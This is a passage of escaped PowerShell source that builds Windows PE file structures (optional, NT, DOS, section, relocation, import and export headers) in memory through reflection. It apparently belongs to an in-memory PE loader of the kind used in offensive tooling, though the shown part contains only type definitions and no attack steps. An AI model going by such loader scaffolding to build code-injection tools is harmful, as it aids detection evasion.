\u00a0\u00a0\u00a0($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_OPTIONAL_HEADER32\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_NT_HEADERS64\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_NT_HEADERS32\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_DOS_HEADER\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e_resField.SetCustomAttribute($AttribBuilder)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e_res2Field.SetCustomAttribute($AttribBuilder)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_DOS_HEADER = $TypeBuilder.CreateType() \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_SECTION_HEADER\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$nameField.SetCustomAttribute($AttribBuilder)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_BASE_RELOCATION\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_IMPORT_DESCRIPTOR\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_EXPORT_DIRECTORY\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct LUID\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LUID = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct LUID_AND_ATTRIBUTES\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct 